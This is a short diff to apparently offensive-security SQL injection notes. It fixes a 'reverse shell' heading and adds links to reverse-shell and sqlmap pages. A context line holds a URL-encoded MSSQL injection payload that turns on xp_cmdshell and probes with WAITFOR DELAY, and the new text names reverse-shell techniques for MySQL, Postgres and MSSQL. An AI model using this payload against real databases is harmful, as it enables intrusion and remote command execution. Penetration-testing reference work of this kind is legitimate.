@@ -84,11 +84,13 @@ to got the URI encoded body for query string if field does not allow for special
 '%20EXEC%20sp_configure%20'show%20advanced%20options'%2C%20'1'%3B%20RECONFIGURE%3B%20EXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%20%3B%20RECONFIGURE%20%3B%20WAITFOR%20DELAY%20'00%3A00%3A03'%20--
 ```
 
-### Get reversre
+### Get reverse shell
 
-../../infiltration/reverse-shell/sql.md
+[SQL reverse shells](../../infiltration/reverse-shell/sql.md) — MySQL `INTO OUTFILE`, Postgres `COPY … PROGRAM`, MSSQL `xp_cmdshell`.
 
 ## Resources
 
-- [sqlmap](https://sqlmap.org/) — automated follow-up when manual SQLi is confirmed
+- [sqlmap](./sqlmap.md) — automated follow-up when manual SQLi is confirmed
+- [SQL reverse shells](../../infiltration/reverse-shell/sql.md) — OS shell after SQLi
+- [sqlmap.org](https://sqlmap.org/) — project homepage
 - [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) — payload lookup
